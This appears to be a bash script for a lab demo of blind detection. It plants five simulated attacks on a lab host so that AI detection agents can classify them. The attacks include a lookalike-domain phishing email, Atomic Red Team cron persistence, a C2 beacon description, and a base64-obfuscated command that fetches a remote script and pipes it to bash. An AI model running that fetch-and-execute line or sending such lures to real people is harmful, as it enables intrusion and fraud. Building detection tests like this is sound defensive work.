#!/bin/bash
# Blind detection demo: reset, then plant all 5 attacks with NO marks and
# NO technique supplied to any agent. Run in T2 (agent host) BEFORE starting
# the scheduler in T1. Proves agents detect + classify with no foreknowledge.
set -u

VICTIM_IP="10.10.10.30"
VICTIM_USER="ted"

echo "=== [1] resetting to clean baseline ==="
ssh -n ${VICTIM_USER}@${VICTIM_IP} "sudo systemctl stop vsftpd; crontab -r 2>/dev/null" 2>/dev/null
rm -f emails/${VICTIM_IP}.txt commands/${VICTIM_IP}.txt connections/${VICTIM_IP}.txt
rm -f *_alerts.jsonl attack_log.jsonl scheduler_cycles.jsonl agent_errors.jsonl
echo "    clean."

echo "=== [2] planting all 5 attacks (no marks, no technique told) ==="

echo "    - Recon: opening FTP port 21"
ssh -n ${VICTIM_USER}@${VICTIM_IP} "sudo systemctl start vsftpd" 2>/dev/null

echo "    - Delivery: phishing email"
cat > emails/${VICTIM_IP}.txt <<'EOF'
From: it-support@paypa1-secure.com
Subject: URGENT: Verify your account or it will be suspended

Dear user, your account access is suspended. Click here to verify your
identity within 24 hours: http://bit.ly/3xAmpleLink
EOF

echo "    - Exploitation: obfuscated base64|bash command"
cat > commands/${VICTIM_IP}.txt <<'EOF'
echo ZWNobyAiaGkiOyBjdXJsIC1zIGh0dHA6Ly80NS4zMy4xMi45L3guc2ggfCBiYXNo | base64 -d | bash
EOF

echo "    - Installation: cron persistence (Atomic)"
ssh -n ${VICTIM_USER}@${VICTIM_IP} "pwsh -Command \"Import-Module invoke-atomicredteam; Invoke-AtomicTest T1053.003 -TestNumbers 1\"" 2>/dev/null

echo "    - C2: beacon indicators"
cat > connections/${VICTIM_IP}.txt <<'EOF'
Observed outbound network activity from host 10.10.10.30:

Destination 45.33.12.9:8443 (raw IP, HTTPS port), connection repeats every
60 seconds +/- 2s with near-perfect regularity over the last 30 minutes.
Each request sends 128 bytes out and receives 96 bytes in - consistent tiny
payloads with no variation. No browser process is associated with the
traffic. User-Agent string observed: "HttpBrowser/1.0". No DNS lookup
precedes the connections; the raw IP is contacted directly.

Also present: one normal SSH session on port 22 to 10.10.10.20.
EOF

echo ""
echo "=== all 5 attacks planted. Agents were told NOTHING. ==="
echo "Now in T1 run:"
echo "  python scheduler.py --target ${VICTIM_IP} --interval 30 --stagger 4 --cycles 3"
echo "Then back here run:"
echo "  python format_report.py --host ${VICTIM_IP} | tee blind_detection_report.txt"
